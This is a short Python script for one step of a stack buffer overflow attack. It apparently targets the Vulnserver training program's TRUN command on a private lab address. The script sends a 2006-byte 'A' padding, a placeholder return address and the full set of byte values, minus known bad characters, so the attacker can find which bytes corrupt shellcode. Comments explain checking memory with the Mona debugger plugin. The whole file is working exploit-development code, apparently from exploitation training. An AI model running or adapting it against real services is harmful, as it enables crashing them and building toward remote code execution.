# -*-coding:Latin-1 -*
import socket
import time
import sys

# ----- INPUT -----
target = '192.168.56.104'
port = 9999
offset = 2006
badchars= [0x00] # Keep updating this until you get unmodified shellcode
# -----------------

TIMEOUT = 2

allchars= ""
for i in range(0x00, 0xFF+1):
    if i not in badchars:
        allchars += chr(i)

#with open('badchars.bin', 'wb') as f:
#	f.write(allchars)
# Then with Mona: !mona compare -a esp -f c:\badchars.bin
# -a esp: compare the content of memory at the address pointed to by ESP

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    s.connect((target, port))

    print('Sending evil data...')
    # ----- EXPLOIT -----
    s.recv(1024)
    buffer = 'A' * offset + 'B' * 4 + allchars
    cmd = 'TRUN .' + buffer
    s.send(cmd.encode())
    # -------------------
    print('Done!')
    s.close()

except socket.timeout:
    print('Remote host seems down!')
except Exception as e:
    print("Exception: %s" % str(e))
    sys.exit(1)
